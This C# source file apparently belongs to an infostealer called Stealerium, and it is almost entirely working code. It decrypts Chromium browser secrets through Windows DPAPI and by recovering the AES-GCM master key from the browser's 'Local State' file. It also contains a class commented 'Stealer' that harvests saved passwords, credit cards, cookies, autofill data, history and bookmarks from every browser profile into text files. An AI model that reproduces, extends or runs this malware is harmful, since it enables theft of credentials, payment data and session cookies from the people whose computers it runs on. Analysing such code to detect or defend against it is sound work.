using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal sealed class Crypto
    {
        // Speed up decryption using master key
        private static string _sPrevBrowserPath = "";
        private static byte[] _sPrevMasterKey = { };

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription,
            ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags,
            ref DataBlob pPlainText);

        // Chrome < 80
        public static byte[] DpapiDecrypt(byte[] bCipher, byte[] bEntropy = null)
        {
            var pPlainText = new DataBlob();
            var pCipherText = new DataBlob();
            var pEntropy = new DataBlob();

            var pPrompt = new CryptprotectPromptstruct
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };

            var sEmpty = string.Empty;

            try
            {
                try
                {
                    if (bCipher == null)
                        bCipher = Array.Empty<byte>();

                    pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
                    pCipherText.cbData = bCipher.Length;
                    Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);
                }
                catch
                {
                    // ignored
                }

                try
                {
                    if (bEntropy == null)
                        bEntropy = Array.Empty<byte>();

                    pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
                    pEntropy.cbData = bEntropy.Length;

                    Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);
                }
                catch
                {
                    // ignored
                }

                CryptUnprotectData(ref pCipherText, ref sEmpty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1,
                    ref pPlainText);

                var bDestination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, bDestination, 0, pPlainText.cbData);
                return bDestination;
            }
            catch
            {
                // ignored
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);

                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);

                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }

            return Array.Empty<byte>();
        }

        // Chrome > 80
        public static byte[] GetMasterKey(string sLocalStateFolder)
        {
            var sLocalStateFile = sLocalStateFolder;

            if (sLocalStateFile.Contains("Opera"))
                sLocalStateFile += "\\Opera Stable\\Local State";
            else
                sLocalStateFile += "\\Local State";

            byte[] bMasterKey = { };

            if (!File.Exists(sLocalStateFile))
                return null;

            // Ну карочи так быстрее работает, да
            if (sLocalStateFile != _sPrevBrowserPath)
                _sPrevBrowserPath = sLocalStateFile;
            else
                return _sPrevMasterKey;


            var pattern = new Regex("\"encrypted_key\":\"(.*?)\"",
                RegexOptions.Compiled).Matches(
                File.ReadAllText(sLocalStateFile));
            foreach (Match prof in pattern)
                if (prof.Success)
                    bMasterKey = Convert.FromBase64String(prof.Groups[1].Value);


            var bRawMasterKey = new byte[bMasterKey.Length - 5];
            Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);

            try
            {
                _sPrevMasterKey = DpapiDecrypt(bRawMasterKey);
                return _sPrevMasterKey;
            }
            catch
            {
                return null;
            }
        }

        public static string GetUtf8(string sNonUtf8)
        {
            try
            {
                var bData = Encoding.Default.GetBytes(sNonUtf8);
                return Encoding.UTF8.GetString(bData);
            }
            catch
            {
                return sNonUtf8;
            }
        }


        public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
        {
            byte[] bIv = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
            Array.Copy(bEncryptedData, 3, bIv, 0, 12);

            try
            {
                var bBuffer = new byte[bEncryptedData.Length - 15];
                Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);
                var bTag = new byte[16];
                var bData = new byte[bBuffer.Length - bTag.Length];
                Array.Copy(bBuffer, bBuffer.Length - 16, bTag, 0, 16);
                Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - bTag.Length);
                var aDecryptor = new CAesGcm();
                return aDecryptor.Decrypt(bMasterKey, bIv, null, bData, bTag);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return null;
            }
        }

        public static string EasyDecrypt(string sLoginData, string sPassword)
        {
            if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
            {
                var bMasterKey = GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
                return Encoding.Default.GetString(DecryptWithKey(Encoding.Default.GetBytes(sPassword), bMasterKey));
            }

            return Encoding.Default.GetString(DpapiDecrypt(Encoding.Default.GetBytes(sPassword)));
        }

        public static string BrowserPathToAppName(string sLoginData)
        {
            if (sLoginData.Contains("Opera")) return "Opera";
            var replace = sLoginData.Replace(Paths.Lappdata, "");
            return replace.Split('\\')[1];
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }
    }

    // Stealer
    internal sealed class Recovery
    {
        public static void Run(string sSavePath)
        {
            if (!Directory.Exists(sSavePath))
                Directory.CreateDirectory(sSavePath);

            foreach (var sPath in Paths.SChromiumPswPaths)
            {
                string sFullPath;
                if (sPath.Contains("Opera Software"))
                    sFullPath = Paths.Appdata + sPath;
                else
                    sFullPath = Paths.Lappdata + sPath;

                if (Directory.Exists(sFullPath))
                    foreach (var sProfile in Directory.GetDirectories(sFullPath))
                    {
                        // Write chromium passwords, credit cards, cookies
                        var sBDir = sSavePath + "\\" + Crypto.BrowserPathToAppName(sPath);
                        Directory.CreateDirectory(sBDir);
                        // Run tasks
                        var pCreditCards = CreditCards.Get(sProfile + "\\Web Data");
                        var pPasswords = Passwords.Get(sProfile + "\\Login Data");
                        var pCookies = Cookies.Get(sProfile + "\\Cookies");
                        var pHistory = History.Get(sProfile + "\\History");
                        var pDownloads = Downloads.Get(sProfile + "\\History");
                        var pAutoFill = Autofill.Get(sProfile + "\\Web Data");
                        var pBookmarks = Bookmarks.Get(sProfile + "\\Bookmarks");
                        // Await values and write
                        CBrowserUtils.WriteCreditCards(pCreditCards, sBDir + "\\CreditCards.txt");
                        CBrowserUtils.WritePasswords(pPasswords, sBDir + "\\Passwords.txt");
                        CBrowserUtils.WriteCookies(pCookies, sBDir + "\\Cookies.txt");
                        CBrowserUtils.WriteHistory(pHistory, sBDir + "\\History.txt");
                        CBrowserUtils.WriteHistory(pDownloads, sBDir + "\\Downloads.txt");
                        CBrowserUtils.WriteAutoFill(pAutoFill, sBDir + "\\AutoFill.txt");
                        CBrowserUtils.WriteBookmarks(pBookmarks, sBDir + "\\Bookmarks.txt");
                    }
            }
        }
    }
}